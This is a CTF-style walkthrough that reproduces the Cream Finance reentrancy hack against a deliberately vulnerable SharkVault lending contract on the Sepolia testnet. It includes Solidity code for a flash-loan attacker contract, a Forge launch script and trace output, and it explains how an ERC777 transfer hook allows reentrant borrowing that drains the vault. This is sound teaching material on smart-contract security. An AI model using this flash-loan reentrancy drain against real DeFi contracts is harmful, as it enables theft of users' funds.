# CREAM FINANCE - REKT
Based on the 2021 Cream Finance hack from the [Rekt Leaderboard](https://rekt.news/leaderboard/). 

## Overview

The contract [`SharkVault.sol`](contracts/SharkVault.sol) allow users to take loans. Here is a brief overview:
- depositGold() and withdrawGold() are used to deposit and withdraw GOLD as collateral.
- For every 100 GOLD deposited, users can borrow up to 75 SEAGOLD.

But it has a vulnerability. The goal is to exploit it with a flash loan following [EIP-3156](https://eips.ethereum.org/EIPS/eip-3156).

The contract `GoldLender` is implementing [IERC3156FlashLender.sol](contracts/interfaces/IERC3156FlashLender.sol).

## Deployments (Sepolia)
| Contract        | Address      |
| ------|-----|
| SharkVault  	| [0xCB944635f55Ab4310fb5F74671a2fE2792C0B098](https://sepolia.etherscan.io/address/0xCB944635f55Ab4310fb5F74671a2fE2792C0B098)	| 
| GoldLender    | [0xfCb668c2108782AC6B0916032BD2aF5a1563E65D](https://sepolia.etherscan.io/address/0xfCb668c2108782AC6B0916032BD2aF5a1563E65D)	| 

## Walkthrough
After deployment, `SharkVault.sol` has 3000 SEAGOLD and `GoldLender` only has 1000 GOLD available.

Notice that the borrow function is not following the Checks Effects Interactions pattern, meaning that it might be vulnerable to reentrancy.
```solidity
function borrow(uint256 _amount) external {
    LoanAccount memory borrowerAccount = updatedAccount(msg.sender);
    borrowerAccount.borrowedSeagold += _amount;

    // Fail if insufficient remaining balance of $SEAGOLD
    uint256 seagoldBalance = seagold.balanceOf(address(this));
    require(_amount <= seagoldBalance, "Insufficient $SEAGOLD to lend");

    // Fail if borrower has insufficient gold collateral
    require(_hasEnoughCollateral(borrowerAccount), "Undercollateralized $SEAGOLD loan");

    // Transfer $SEAGOLD and update records
    seagold.transfer(msg.sender, _amount);
    accounts[msg.sender] = borrowerAccount;
}
```

The `seagold.transfer(msg.sender, _amount)` call is exploitable if seagold is implementing another standard than ERC20. Let's verify that.

First, create a `FlashAttacker.sol` contract implementing `IERC3156FlashBorrower`:
```solidity
contract FlashAttacker is IERC3156FlashBorrower {
    enum Action {NORMAL, OTHER}

    IERC3156FlashLender lender;
    SharkVault sharkVault;

    constructor (
        IERC3156FlashLender lender_,
        SharkVault sharkVault_
    ) {
        lender = lender_;
        sharkVault = sharkVault_;
    }

    /// @dev ERC-3156 Flash loan callback
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns(bytes32) {
        require(
            msg.sender == address(lender),
            "FlashBorrower: Untrusted lender"
        );
        require(
            initiator == address(this),
            "FlashBorrower: Untrusted loan initiator"
        );
        (Action action) = abi.decode(data, (Action));
        if (action == Action.NORMAL) {
            IERC20(token).approve(address(sharkVault), 3000*1e18);
            sharkVault.depositGold(1000*1e18);
            sharkVault.borrow(750*1e18);
        } else if (action == Action.OTHER) {
        }
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    /// @dev Initiate a flash loan
    function flashBorrow(
        address token,
        uint256 amount
    ) public {
        bytes memory data = abi.encode(Action.NORMAL);
        uint256 _allowance = IERC20(token).allowance(address(this), address(lender));
        uint256 _fee = lender.flashFee(token, amount);
        uint256 _repayment = amount + _fee;
        IERC20(token).approve(address(lender), _allowance + _repayment);
        lender.flashLoan(this, token, amount, data);
    }
}
```

And run this script `forge script scripts/LaunchAttack.s.sol --rpc-url sepolia`:
```solidity
contract LaunchAttackScript is Script {
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    SharkVault sharkVault = SharkVault(0xCB944635f55Ab4310fb5F74671a2fE2792C0B098);
    IERC3156FlashLender goldLender = IERC3156FlashLender(0xfCb668c2108782AC6B0916032BD2aF5a1563E65D);

    function run() public returns (FlashAttacker flashAttacker) {
        vm.startBroadcast(deployerPrivateKey);
        IERC20 gold = sharkVault.gold();
        IERC20 seagold = sharkVault.seagold();

        flashAttacker = new FlashAttacker(goldLender, sharkVault);

        flashAttacker.flashBorrow(address(gold), 1000*1e18);

        vm.stopBroadcast();
    }
}
```

It returns:
```
  [24689] LaunchAttackScript::run()
    ├─ [0] VM::startBroadcast(29868473663892743784059904813300419623398721198734088061575205807316455675558 [2.986e76])
    │   └─ ← ()
    ├─ [644] 0xCB944635f55Ab4310fb5F74671a2fE2792C0B098::gold() [staticcall]
    │   └─ ← 0x41a23DBF52be3060Fa0910d6AA0F9f2D463E387c
    ├─ [579] 0xCB944635f55Ab4310fb5F74671a2fE2792C0B098::seagold() [staticcall]
    │   └─ ← 0x8fd03562Ffa407d478F481be4498A4dccdc4e03f
    ├─ [9989] 0x8fd03562Ffa407d478F481be4498A4dccdc4e03f::transfer(0xCB944635f55Ab4310fb5F74671a2fE2792C0B098, 3000)
    │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x26d403E1E1A1239d8b6f5907dE272CF311104753, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← revert: ERC777: transfer amount exceeds balance
```

So SEAGOLD is in fact an ERC777 token. This means we can modify `FlashAttacker.sol` to use the hook feature in order to do a reentrant call on borrow, see the implementation [`FlashAttacker.sol`](contracts/FlashAttacker.sol).

Executing the `LaunchAttack.s.sol` script again effectively withdraw the all the SEAGOLD from the contract, and send back the GOLD to the `GoldLender`, see the transaction details on [etherscan](https://sepolia.etherscan.io/tx/0x6ca1d37c248f88f0b31f6c73beb1d2dffae518aa11d050ca3135faa9d593b039).